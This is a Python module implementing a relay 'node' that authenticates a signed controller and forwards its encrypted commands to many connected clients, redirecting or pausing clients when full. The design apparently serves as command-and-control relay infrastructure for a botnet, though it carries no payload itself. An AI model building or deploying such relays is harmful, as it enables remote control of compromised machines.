import socket
import threading
import random
import logging
import select
import uuid
import json
from pathlib import Path
from typing import Optional, Dict, Tuple, List
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from .crypto import Crypto
from .logger import getLogger

PUBLIC_KEY_PATH = Path("data/keys/pub.key")
NODES_FILE_PATH = Path("data/nodes.network")
BUFFER_SIZE_LENGTH = 2
SOCKET_TIMEOUT = 5.0
CLIENT_POLL_INTERVAL = 5.0
NODE_COMMANDS = {"status", "sync_nodes", "get_clients", "disconnect_client"}


class Node:
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 547,
        debug: bool = True,
        max_clients: int = 50,
        clients_overflow_sleep: int = 3600,
    ) -> None:
        self.host = host
        self.port = port
        self.debug = debug
        self.max_clients = max_clients
        self.clients_overflow_sleep = clients_overflow_sleep
        self.running = False
        self.clients: Dict[socket.socket, Dict[str, str]] = {}
        self.clients_lock = threading.Lock()

        self.logger = getLogger("node", debug)

        self.crypto = Crypto(debug)
        self.node_socket: Optional[socket.socket] = None

        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        try:
            with PUBLIC_KEY_PATH.open("r") as f:
                self.controller_pub = self.crypto.load_public_key(f.read().encode())
        except FileNotFoundError:
            self.logger.error("Controller public key file missing")
            raise
        except ValueError as e:
            self.logger.error(f"Invalid controller public key: {e}")
            raise

    def setup_socket(self) -> None:
        self.logger.info(f"Binding to {self.host}:{self.port}")
        try:
            self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.node_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.node_socket.bind((self.host, self.port))
            self.node_socket.listen()
            self.running = True
            self.logger.info(f"Running on {self.host}:{self.port}")
        except socket.error as e:
            self.logger.error(f"Socket setup failed: {e}")
            self.running = False
            raise

    def run(self) -> None:
        self.setup_socket()
        if not self.running:
            self.logger.error("Node startup failed")
            return

        try:
            while self.running:
                with self.clients_lock:
                    client_sockets = list(self.clients.keys())
                sockets_to_monitor = [self.node_socket] + client_sockets
                readable, _, _ = select.select(
                    sockets_to_monitor, [], [], CLIENT_POLL_INTERVAL
                )

                for sock in readable:
                    if sock is self.node_socket:
                        self._accept_client_connection()
                    else:
                        self._check_client_connection(sock)
        except KeyboardInterrupt:
            self.logger.info("Node stopped by user")
        except socket.error as e:
            self.logger.error(f"Socket error: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
        finally:
            self.shutdown()

    def _accept_client_connection(self) -> None:
        try:
            client_socket, addr = self.node_socket.accept()
            self.logger.debug(f"Connection from {addr}")
            threading.Thread(
                target=self.handle_connection,
                args=(client_socket, addr),
                daemon=True,
            ).start()
        except socket.error as e:
            self.logger.error(f"Failed to accept connection: {e}")

    def _check_client_connection(self, client_socket: socket.socket) -> None:
        addr = self.get_address(client_socket)
        try:
            client_socket.settimeout(0.1)
            data = client_socket.recv(1, socket.MSG_PEEK)
            if not data:
                self.disconnect_connection(client_socket, addr)
        except socket.timeout:
            pass
        except socket.error as e:
            self.logger.warning(f"Client {addr} check failed: {e}")
            self.disconnect_connection(client_socket, addr)

    def verify_controller_signature(self, message: bytes, signature: bytes) -> bool:
        try:
            self.controller_pub.verify(
                signature,
                message,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH,
                ),
                hashes.SHA256(),
            )
            self.logger.info("Controller signature verified")
            return True
        except InvalidSignature:
            self.logger.error("Invalid controller signature")
            return False
        except ValueError as e:
            self.logger.error(f"Signature verification failed: {e}")
            return False

    def handle_connection(
        self, client_socket: socket.socket, addr: Tuple[str, int]
    ) -> None:
        client_id = self._exchange_public_keys(client_socket, addr)

        role = self.check_auth(client_socket, addr, client_id)
        if not role:
            return

        if role == "client":
            client_socket.settimeout(SOCKET_TIMEOUT)
            if len(self.clients) > self.max_clients:
                self._handle_client_overflow(client_socket, addr)
                return

        try:
            while self.running:
                if not client_socket.fileno() < 0:
                    if role == "controller":
                        self.process_controller_messages(client_socket, addr)
                    elif role == "client":
                        select.select([client_socket], [], [], CLIENT_POLL_INTERVAL)
                else:
                    break
        except socket.error as e:
            self.logger.error(f"Connection error with {addr} (ID: {client_id}): {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error with {addr} (ID: {client_id}): {e}")
        finally:
            if not client_socket.fileno() < 0:
                self.disconnect_connection(client_socket, addr)

    def _exchange_public_keys(
        self, client_socket: socket.socket, addr: Tuple[str, int]
    ) -> Optional[str]:
        pubkey_pem = self.crypto.serialize_public_key(self.public_key)
        try:
            client_socket.sendall(
                len(pubkey_pem).to_bytes(BUFFER_SIZE_LENGTH, "big") + pubkey_pem
            )
            self.logger.debug(f"Sent public key to {addr}")
        except socket.error as e:
            self.logger.error(f"Failed to send public key to {addr}: {e}")
            self.disconnect_connection(client_socket, addr)
            return None

        key_len_bytes = self.receive_bytes(client_socket, BUFFER_SIZE_LENGTH, addr)
        if not key_len_bytes:
            return None

        key_len = int.from_bytes(key_len_bytes, "big")
        client_pubkey_pem = self.receive_bytes(client_socket, key_len, addr)
        if not client_pubkey_pem:
            return None

        try:
            client_pubkey = self.crypto.load_public_key(client_pubkey_pem)
            client_id = str(uuid.uuid4())[:8]
            with self.clients_lock:
                self.clients[client_socket] = {
                    "uuid": client_id,
                    "pubkey": client_pubkey,
                }
            self.logger.info(f"Client {addr} registered (ID: {client_id})")
            return client_id
        except ValueError as e:
            self.logger.error(f"Invalid public key from {addr}: {e}")
            self.disconnect_connection(client_socket, addr)
            return None

    def _handle_client_overflow(
        self, client_socket: socket.socket, addr: Tuple[str, int]
    ) -> None:
        next_node = self.get_next_node()
        if not next_node:
            self.send_to(
                client_socket,
                json.dumps(
                    {"action": "wait", "data": {"s": self.clients_overflow_sleep}}
                ),
            )
            self.logger.warning(
                f"Max clients ({self.max_clients}) reached, client {addr} instructed to wait"
            )
        else:
            host, port = next_node.split(":")
            self.send_to(
                client_socket,
                json.dumps(
                    {"action": "redirect", "data": {"host": host, "port": int(port)}}
                ),
            )
            self.logger.warning(
                f"Max clients ({self.max_clients}) reached, redirecting {addr} to {next_node}"
            )
        with self.clients_lock:
            self.clients.pop(client_socket, None)

    def check_auth(
        self, client_socket: socket.socket, addr: Tuple[str, int], client_id: str
    ) -> Optional[str]:
        try:
            client_socket.settimeout(SOCKET_TIMEOUT)
            length_bytes = self.receive_bytes(client_socket, BUFFER_SIZE_LENGTH, addr)
            if not length_bytes:
                self.send_confirmation(
                    client_socket,
                    {"status": "error", "message": "No authentication message"},
                )
                return None

            auth_len = int.from_bytes(length_bytes, "big")
            if auth_len > 1024:
                self.logger.warning(
                    f"Auth message too large from {addr} (ID: {client_id})"
                )
                self.send_confirmation(
                    client_socket, {"status": "error", "message": "Message too large"}
                )
                return None

            auth_message = self.receive_bytes(client_socket, auth_len, addr)
            if not auth_message:
                self.send_confirmation(
                    client_socket,
                    {"status": "error", "message": "Failed to receive auth message"},
                )
                return None

            auth_data = json.loads(auth_message.decode())
            role = auth_data.get("role")
            if role not in {"controller", "client"}:
                self.logger.warning(
                    f"Invalid role from {addr} (ID: {client_id}): {role}"
                )
                self.send_confirmation(
                    client_socket, {"status": "error", "message": "Invalid role"}
                )
                return None

            if role == "controller":
                signature = bytes.fromhex(auth_data.get("signature", ""))
                if not self.verify_controller_signature(
                    json.dumps({"role": "controller"}).encode(), signature
                ):
                    self.logger.error(
                        f"Invalid controller signature from {addr} (ID: {client_id})"
                    )
                    self.send_confirmation(
                        client_socket,
                        {"status": "error", "message": "Invalid signature"},
                    )
                    return None
                self.logger.info(
                    f"Controller authenticated from {addr} (ID: {client_id})"
                )
                self.send_confirmation(client_socket, {"status": "success"})
                with self.clients_lock:
                    self.clients.pop(client_socket, None)
                return "controller"

            self.logger.info(f"Client authenticated from {addr} (ID: {client_id})")
            self.send_confirmation(client_socket, {"status": "success"})
            return "client"

        except socket.timeout:
            self.logger.warning(f"Auth timeout from {addr} (ID: {client_id})")
            self.send_confirmation(
                client_socket, {"status": "error", "message": "Authentication timeout"}
            )
            return None
        except json.JSONDecodeError:
            self.logger.warning(f"Invalid auth JSON from {addr} (ID: {client_id})")
            self.send_confirmation(
                client_socket, {"status": "error", "message": "Invalid JSON"}
            )
            return None
        except Exception as e:
            self.logger.error(f"Auth failed for {addr} (ID: {client_id}): {e}")
            self.send_confirmation(
                client_socket, {"status": "error", "message": f"Auth failed: {e}"}
            )
            return None

    def process_controller_messages(
        self, client_socket: socket.socket, addr: Tuple[str, int]
    ) -> None:
        ready, _, _ = select.select([client_socket], [], [], CLIENT_POLL_INTERVAL)
        if not ready:
            return

        length_bytes = self.receive_bytes(client_socket, BUFFER_SIZE_LENGTH, addr)
        if not length_bytes:
            return

        msg_len = int.from_bytes(length_bytes, "big")
        if msg_len > 8192:
            self.logger.warning(f"Controller message too large from {addr}")
            return

        message = self.receive_bytes(client_socket, msg_len, addr)
        if not message:
            return

        sig_len_bytes = self.receive_bytes(client_socket, BUFFER_SIZE_LENGTH, addr)
        if not sig_len_bytes:
            return

        sig_len = int.from_bytes(sig_len_bytes, "big")
        signature = self.receive_bytes(client_socket, sig_len, addr)
        if not signature:
            return

        if not self.verify_controller_signature(message, signature):
            return

        try:
            msg_data = json.loads(message.decode())
            action = msg_data.get("action")

            if action not in NODE_COMMANDS:
                self.logger.info(
                    f"Broadcast to {len(self.clients)} clients from {addr}"
                )
                if len(self.clients) < 1:
                    self.send_to(
                        client_socket,
                        json.dumps(
                            {"status": "error", "message": "no clients connected"}
                        ),
                        True,
                    )
                else:
                    self.send_to_all(message.decode())
                    self.send_to(client_socket, json.dumps({"status": "success"}), True)

            elif action == "status":
                data = json.dumps({"status": "connected"})
                self.send_to(client_socket, data, True)

            elif action == "sync_nodes":
                self._sync_nodes(msg_data.get("data", []))
                self.logger.info(f"Synced nodes with {addr}")

                data = {"status": "success"}
                self.send_to(client_socket, json.dumps(data), True)

            elif action == "get_clients":
                clients = self.get_clients()
                data = {"status": "success", "data": {}}
                for client_socket_item, client_data in clients:
                    data["data"][client_data["uuid"]] = {
                        "addr": client_socket_item.getpeername()
                    }
                self.send_to(client_socket, json.dumps(data), True)

            elif action == "disconnect_client":
                client_id = msg_data.get("data", {}).get("client_id")
                if not client_id:
                    self.send_to(
                        client_socket,
                        json.dumps(
                            {"status": "error", "message": "client_id required"}
                        ),
                        True,
                    )
                    return

                with self.clients_lock:
                    target = None
                    for c_socket, c_data in list(self.clients.items()):
                        if c_data.get("uuid") == client_id:
                            target = c_socket
                            break

                if not target:
                    self.send_to(
                        client_socket,
                        json.dumps({"status": "error", "message": "client not found"}),
                        True,
                    )
                    return

                self.logger.info(
                    f"Disconnecting client {client_id} as requested by {addr}"
                )
                self.disconnect_connection(target, self.get_address(target))
                self.send_to(
                    client_socket,
                    json.dumps(
                        {"status": "success", "message": f"Disconnected {client_id}"}
                    ),
                    True,
                )

        except json.JSONDecodeError as e:
            self.logger.error(f"Invalid controller JSON from {addr}: {e}")
        except Exception as e:
            self.logger.error(f"Controller message processing failed from {addr}: {e}")

    def _sync_nodes(self, nodes: List[str]) -> None:
        try:
            if not NODES_FILE_PATH.exists():
                NODES_FILE_PATH.parent.mkdir(parents=True, exist_ok=True)
                NODES_FILE_PATH.write_text("")

            with NODES_FILE_PATH.open("r", encoding="utf-8") as f:
                existing_nodes = set(line.strip() for line in f if line.strip())

            new_nodes = [node for node in nodes if node not in existing_nodes]
            if new_nodes:
                with NODES_FILE_PATH.open("a", encoding="utf-8") as f:
                    f.write("\n".join(new_nodes) + "\n")
                self.logger.info(f"Added {len(new_nodes)} nodes to {NODES_FILE_PATH}")
        except IOError as e:
            self.logger.error(f"Node sync failed: {e}")

    def disconnect_connection(
        self, client_socket: socket.socket, addr: Tuple[str, int]
    ) -> None:
        with self.clients_lock:
            client_data = self.clients.pop(client_socket, None)
        try:
            client_socket.close()
            client_id = client_data["uuid"] if client_data else "unknown"
            self.logger.warning(f"Client {addr} (ID: {client_id}) disconnected")
        except socket.error as e:
            self.logger.warning(f"Failed to close socket for {addr}: {e}")

    def send_to(
        self, client_socket: socket.socket, message: str, controller=False
    ) -> None:
        addr = self.get_address(client_socket)
        try:
            if not controller:
                with self.clients_lock:
                    client_data = self.clients.get(client_socket)
                    if not client_data:
                        raise ConnectionError("Client not connected")

            if controller:
                client_pubkey = self.controller_pub
            else:
                client_pubkey = client_data["pubkey"]

            session_key = self.crypto.generate_aes_key()
            encrypted_msg = self.crypto.aes_encrypt(session_key, message.encode())
            encrypted_session_key = self.crypto.rsa_encrypt(client_pubkey, session_key)

            payload = (
                len(encrypted_session_key).to_bytes(BUFFER_SIZE_LENGTH, "big")
                + encrypted_session_key
                + len(encrypted_msg).to_bytes(BUFFER_SIZE_LENGTH, "big")
                + encrypted_msg
            )
            client_socket.sendall(payload)

            if not controller:
                self.logger.debug(
                    f"Sent encrypted message to {addr} (ID: {client_data['uuid']})"
                )

                ready, _, _ = select.select([client_socket], [], [], SOCKET_TIMEOUT)
                if not ready:
                    raise ConnectionError(f"No ACK from {addr}")

                length_bytes = self.receive_bytes(
                    client_socket, BUFFER_SIZE_LENGTH, addr
                )
                if not length_bytes:
                    raise ConnectionError(f"No ACK length from {addr}")

                ack_len = int.from_bytes(length_bytes, "big")
                ack_encrypted = self.receive_bytes(client_socket, ack_len, addr)
                if not ack_encrypted:
                    raise ConnectionError(f"No ACK payload from {addr}")

                ack = self.crypto.rsa_decrypt(self.private_key, ack_encrypted).decode()
                self.logger.debug(
                    f"ACK received from {addr} (ID: {client_data['uuid']}): {ack}"
                )

        except (socket.error, ConnectionError) as e:
            self.logger.error(f"Send failed to {addr}: {e}")
            self.disconnect_connection(client_socket, addr)

    def send_confirmation(self, client_socket: socket.socket, message: Dict) -> None:
        addr = self.get_address(client_socket)
        try:
            message_bytes = json.dumps(message).encode()
            client_socket.sendall(
                len(message_bytes).to_bytes(BUFFER_SIZE_LENGTH, "big") + message_bytes
            )
            self.logger.info(f"Confirmation sent to {addr}: {message}")
        except socket.error as e:
            self.logger.warning(f"Confirmation send failed to {addr}: {e}")

    def send_to_all(self, message: str) -> None:
        with self.clients_lock:
            clients = list(self.clients.items())
        for client_socket, client_data in clients:
            self.send_to(client_socket, message)
            self.logger.debug(f"Broadcast to client ID: {client_data['uuid']}")

    def receive_bytes(
        self, sock: socket.socket, n: int, addr: Tuple[str, int]
    ) -> Optional[bytes]:
        data = b""
        while len(data) < n:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    self.logger.warning(
                        f"Connection closed receiving {n} bytes from {addr}"
                    )
                    self.disconnect_connection(sock, addr)
                    return None
                data += chunk
            except socket.timeout:
                self.logger.warning(f"Timeout receiving {n} bytes from {addr}")
                return None
            except socket.error as e:
                self.logger.error(f"Receive error from {addr}: {e}")
                return None
        self.logger.debug(f"Received {len(data)} bytes from {addr}")
        return data

    def get_clients(self) -> List[Tuple[socket.socket, Dict[str, str]]]:
        with self.clients_lock:
            return list(self.clients.items())

    def get_address(self, client: socket.socket) -> Tuple[str, int]:
        try:
            return client.getpeername()
        except socket.error as e:
            self.logger.debug(f"Failed to get client address: {e}")
            return ("unknown", 0)

    def get_next_node(self) -> Optional[str]:
        try:
            with NODES_FILE_PATH.open("r") as f:
                nodes = [line.strip() for line in f if line.strip()]
            if len(nodes) <= 1:
                return None

            current_node = f"{self.host}:{self.port}"
            available_nodes = [node for node in nodes if node != current_node]
            return random.choice(available_nodes) if available_nodes else None
        except FileNotFoundError:
            self.logger.error(f"{NODES_FILE_PATH} missing")
            return None
        except IOError as e:
            self.logger.error(f"Failed to read {NODES_FILE_PATH}: {e}")
            return None

    def shutdown(self) -> None:
        self.logger.info("Shutting down node")
        self.running = False
        with self.clients_lock:
            for client_socket in list(self.clients.keys()):
                try:
                    client_socket.close()
                    self.logger.debug("Client socket closed")
                except socket.error as e:
                    self.logger.warning(f"Client socket close failed: {e}")
            self.clients.clear()
        if self.node_socket:
            try:
                self.node_socket.close()
                self.logger.info("Node socket closed")
            except socket.error as e:
                self.logger.warning(f"Node socket close failed: {e}")
        self.logger.info("Node shutdown complete")
